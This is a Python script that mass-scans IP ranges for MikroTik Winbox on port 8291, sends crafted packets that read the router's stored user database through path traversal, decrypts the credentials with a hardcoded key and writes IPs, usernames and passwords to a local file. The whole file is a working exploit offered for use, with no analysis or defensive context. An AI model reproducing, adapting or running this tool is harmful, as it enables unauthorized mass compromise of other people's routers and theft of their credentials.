#!/usr/bin/env python3

import socket
import sys
import hashlib
import requests
import os
import subprocess
import ipaddress
from threading import Thread
from netaddr import *

def decrypt_password(user, pass_enc):
    key = hashlib.md5(user + b"283i4jfkai3389").digest()
    passw = ""
    for i in range(0, len(pass_enc)):
        passw += chr(pass_enc[i] ^ key[i % len(key)])
    return passw.split("\x00")[0]

def extract_user_pass_from_entry(entry):
    user_data = entry.split(b"\x01\x00\x00\x21")[1]
    pass_data = entry.split(b"\x11\x00\x00\x21")[1]
    user_len = user_data[0]
    pass_len = pass_data[0]
    username = user_data[1:1 + user_len]
    password = pass_data[1:1 + pass_len]
    return username, password

def get_pair(data):
    user_list = []
    entries = data.split(b"M2")[1:]
    for entry in entries:
        try:
            user, pass_encrypted = extract_user_pass_from_entry(entry)
        except:
            continue

        pass_plain = decrypt_password(user, pass_encrypted)
        user  = user.decode("ascii")
        user_list.append((user, pass_plain))

    return user_list

def dump(ip, data):
    user_pass = get_pair(data)
    for u, p in user_pass:
        sys.stdout.write('[*] ========================================\n')
        sys.stdout.write('[+] IP   : {}\n'.format(ip))
        sys.stdout.write('[+] User : {}\n'.format(u))
        sys.stdout.write('[+] Pass : {}\n'.format(p))
        open('hasil_ip.txt', 'a').write('{},{},{}\n'.format(ip, u, p))

def exploit(ip):
    a = [0x68, 0x01, 0x00, 0x66, 0x4d, 0x32, 0x05, 0x00,
        0xff, 0x01, 0x06, 0x00, 0xff, 0x09, 0x05, 0x07,
        0x00, 0xff, 0x09, 0x07, 0x01, 0x00, 0x00, 0x21,
        0x35, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2e, 0x2f,
        0x2e, 0x2e, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f,
        0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x2f, 0x2f, 0x2f,
        0x2f, 0x2f, 0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x66,
        0x6c, 0x61, 0x73, 0x68, 0x2f, 0x72, 0x77, 0x2f,
        0x73, 0x74, 0x6f, 0x72, 0x65, 0x2f, 0x75, 0x73,
        0x65, 0x72, 0x2e, 0x64, 0x61, 0x74, 0x02, 0x00,
        0xff, 0x88, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0xff, 0x88,
        0x02, 0x00, 0x02, 0x00, 0x00, 0x00, 0x02, 0x00,
        0x00, 0x00]
    b = [0x3b, 0x01, 0x00, 0x39, 0x4d, 0x32, 0x05, 0x00,
        0xff, 0x01, 0x06, 0x00, 0xff, 0x09, 0x06, 0x01,
        0x00, 0xfe, 0x09, 0x35, 0x02, 0x00, 0x00, 0x08,
        0x00, 0x80, 0x00, 0x00, 0x07, 0x00, 0xff, 0x09,
        0x04, 0x02, 0x00, 0xff, 0x88, 0x02, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01,
        0x00, 0xff, 0x88, 0x02, 0x00, 0x02, 0x00, 0x00,
        0x00, 0x02, 0x00, 0x00, 0x00]
    try:
        s = socket.socket()
        s.settimeout(3)
        s.connect((ip, 8291))
        a = bytearray(a)
        b = bytearray(b)
        s.send(a)
        d = bytearray(s.recv(1024))
        b[19] = d[38]
        s.send(b)
        d = bytearray(s.recv(1024))
        dump(ip, d[55:])
    except:
         sys.stdout.write('[-] {} [failed]\n'.format(ip))

def winbox_exploit_mass(target):
    if os.getuid() != 0:
        print('[!] Need to run as root...')
        return False

    try: net = ipaddress.IPv4Network(target)
    except:
        print('[!] Range invalid...')
        return False

    print('[*] Mass port scanning...')
    ex = subprocess.getoutput('sudo masscan {} -p 8291 >> has.txt'.format(target))
    dats = open('has.txt', 'r').read().split('\n')
    for ip in dats:
        if ip == '': os.system('rm has.txt'); break
        else: exploit(ip.split(' ')[5])

    print('[*] ========================================')
    print('[+] Result saved to hasil_ip.txt')
    print('[!] Done...')
